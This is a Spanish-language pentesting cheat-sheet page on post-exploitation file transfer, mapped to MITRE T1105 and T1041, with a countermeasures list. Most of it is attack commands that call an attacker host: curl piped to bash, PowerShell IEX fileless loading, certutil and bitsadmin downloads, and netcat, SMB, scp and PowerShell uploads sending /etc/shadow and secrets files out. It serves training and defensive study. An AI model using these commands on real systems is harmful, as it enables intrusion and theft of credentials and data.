# Transferencia de Archivos en Post-Explotación

## Descripción
La transferencia de archivos es una actividad fundamental durante la post-explotación que permite al atacante subir herramientas al sistema comprometido (ingress tool transfer) y descargar datos sensibles (exfiltración). Las técnicas varían según el sistema operativo, los controles de seguridad presentes y los protocolos permitidos. En Linux se usan comúnmente wget, curl, netcat y Python HTTP servers, mientras que en Windows se aprovechan certutil, PowerShell, bitsadmin y SMB. La elección del método depende de qué herramientas están disponibles en el sistema y qué tráfico de red está permitido por el firewall.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1105 (Ingress Tool Transfer); T1041 (Exfiltration Over C2 Channel)
- **Plataforma**: Multi
- **Dificultad**: Básica

## Herramientas
- **python3** (`-m http.server`) — servidor HTTP simple para servir archivos
- **wget** / **curl** — descarga de archivos vía HTTP/HTTPS en Linux
- **certutil.exe** — descarga de archivos en Windows (LOLBin)
- **PowerShell** (`Invoke-WebRequest`, `IWR`) — descarga y carga de archivos en Windows
- **netcat** (`nc`) — transferencia bidireccional de archivos vía TCP
- **smbserver.py** (Impacket) — servidor SMB para transferencia en redes Windows
- **scp** / **sftp** — transferencia cifrada vía SSH

## Comandos / Ejemplos

### Servidor HTTP en el atacante
```bash
# Python 3 — servidor HTTP en directorio actual
python3 -m http.server 8080

# Python 2 (fallback)
python -m SimpleHTTPServer 8080

# PHP (alternativa)
php -S 0.0.0.0:8080

# Ruby
ruby -run -e httpd . -p 8080
```

### Descarga en Linux
```bash
# wget — método más común
wget http://10.10.14.5:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# curl — versátil, permite ejecución directa en memoria
curl http://10.10.14.5:8080/linpeas.sh -o /tmp/linpeas.sh

# curl — ejecutar sin tocar disco
curl http://10.10.14.5:8080/linpeas.sh | bash

# Bash /dev/tcp (sin herramientas externas)
cat < /dev/tcp/10.10.14.5/8080 > /tmp/tool
```

### Descarga en Windows
```powershell
# certutil — disponible en todas las versiones de Windows
certutil.exe -urlcache -f http://10.10.14.5:8080/winpeas.exe C:\temp\winpeas.exe

# PowerShell Invoke-WebRequest
Invoke-WebRequest -Uri http://10.10.14.5:8080/winpeas.exe -OutFile C:\temp\winpeas.exe
# Alias corto
iwr http://10.10.14.5:8080/winpeas.exe -o C:\temp\winpeas.exe

# PowerShell — ejecución en memoria (fileless)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/PowerUp.ps1')

# bitsadmin — transferencia en background
bitsadmin /transfer job /download /priority high http://10.10.14.5:8080/payload.exe C:\temp\payload.exe

# PowerShell — carga de archivos (exfiltración)
Invoke-WebRequest -Uri http://10.10.14.5:8080/upload -Method POST -InFile C:\Users\admin\Desktop\secrets.txt
```

### Transferencia con Netcat
```bash
# Receptor (atacante) — escuchar y guardar archivo
nc -nlvp 4444 > archivo_recibido.txt

# Emisor (víctima) — enviar archivo
nc -nv 10.10.14.5 4444 < /etc/shadow

# Transferencia de binario (atacante sirve, víctima descarga)
# Atacante:
nc -nlvp 4444 < linpeas.sh
# Víctima:
nc -nv 10.10.14.5 4444 > /tmp/linpeas.sh
```

### Transferencia con SMB (Impacket)
```bash
# Atacante: levantar servidor SMB
impacket-smbserver share /tmp/tools -smb2support

# Víctima (Windows): copiar desde share SMB
copy \\10.10.14.5\share\winpeas.exe C:\temp\winpeas.exe

# Copiar archivos DE la víctima AL atacante
copy C:\Users\admin\Desktop\secrets.txt \\10.10.14.5\share\secrets.txt

# Con autenticación (si se requiere)
impacket-smbserver share /tmp/tools -smb2support -user admin -password admin123
# En la víctima:
net use \\10.10.14.5\share /user:admin admin123
copy \\10.10.14.5\share\tool.exe C:\temp\
```

### Transferencia con SCP/SFTP
```bash
# Subir archivo al objetivo (requiere SSH)
scp linpeas.sh user@10.10.10.50:/tmp/

# Descargar archivo del objetivo
scp user@10.10.10.50:/etc/shadow /tmp/shadow_dump

# SFTP interactivo
sftp user@10.10.10.50
sftp> get /etc/shadow
sftp> put linpeas.sh /tmp/
```

### Transferencia con Meterpreter
```
# Subir archivo al objetivo
meterpreter > upload /tmp/linpeas.sh /tmp/linpeas.sh

# Descargar archivo del objetivo
meterpreter > download C:\\Users\\admin\\Desktop\\secrets.txt /tmp/

# Descargar directorio completo
meterpreter > download C:\\Users\\admin\\Documents /tmp/exfil/
```

### Transferencia con base64 (sin transferencia de red directa)
```bash
# En la víctima — codificar archivo
base64 /etc/shadow

# Copiar el output base64 y en el atacante:
echo "base64_output_aqui" | base64 -d > shadow

# En Windows
certutil -encode C:\temp\secrets.txt C:\temp\secrets.b64
type C:\temp\secrets.b64
# En el atacante: decodificar
```

## Contramedidas
- Implementar listas blancas de aplicaciones (AppLocker/WDAC) para bloquear ejecución de herramientas descargadas
- Monitorear uso de LOLBins para descarga: certutil, bitsadmin, PowerShell con DownloadString/Invoke-WebRequest
- Bloquear conexiones HTTP salientes desde servidores que no lo requieran
- Implementar DLP para detectar transferencias de datos sensibles
- Restringir el tráfico SMB saliente en el firewall perimetral
- Monitorear transferencias de archivos anómalas con herramientas SIEM/EDR
- Deshabilitar PowerShell remoting y restringir scripts con Constrained Language Mode donde sea posible
- Implementar segmentación de red para limitar qué hosts pueden iniciar conexiones salientes

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1105: Ingress Tool Transfer. https://attack.mitre.org/techniques/T1105/
- MITRE Corporation. (2024). ATT&CK Technique T1041: Exfiltration Over C2 Channel. https://attack.mitre.org/techniques/T1041/
- fortra. (s.f.). *Impacket* [Software]. GitHub. https://github.com/fortra/impacket
- LOLBAS Project. (s.f.). *LOLBAS* [Base de datos]. https://lolbas-project.github.io/
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- OccupyTheWeb. (2018). *Linux Basics for Hackers*. No Starch Press.
